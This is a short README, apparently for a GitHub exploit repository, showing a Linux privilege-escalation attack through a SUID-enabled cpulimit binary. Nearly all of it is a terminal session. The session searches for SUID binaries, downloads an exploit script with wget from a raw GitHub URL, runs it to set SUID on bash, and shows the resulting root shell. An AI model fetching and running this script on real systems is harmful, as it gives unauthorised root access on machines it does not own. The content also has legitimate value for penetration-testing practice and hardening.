# CPULimit Linux Privilege Escalation


```bash
user@victim:~$ whoami
user
user@victim:~$ find / -perm -4000 2>/dev/null | grep "cpulimit"
/usr/bin/cpulimit
user@victim:~$ cd /tmp/
user@victim:/tmp$ wget https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
user@victim:/tmp$ chmod +x suid_root.sh 
user@victim:/tmp$ ./suid_root.sh 

[i]  starting exploit.. 
[*]  check PATH bash: /usr/bin/bash
[*]  check PATH cpulimit: /usr/bin/cpulimit
[+]  granting SUID permissions to: /usr/bin/bash
Process 436 detected
Child process is finished, exiting...
[+]  getting a shell as root.. 
bash-5.0# whoami && id && hostname
root
```

**Screenshot**

![](/screenshot.png)
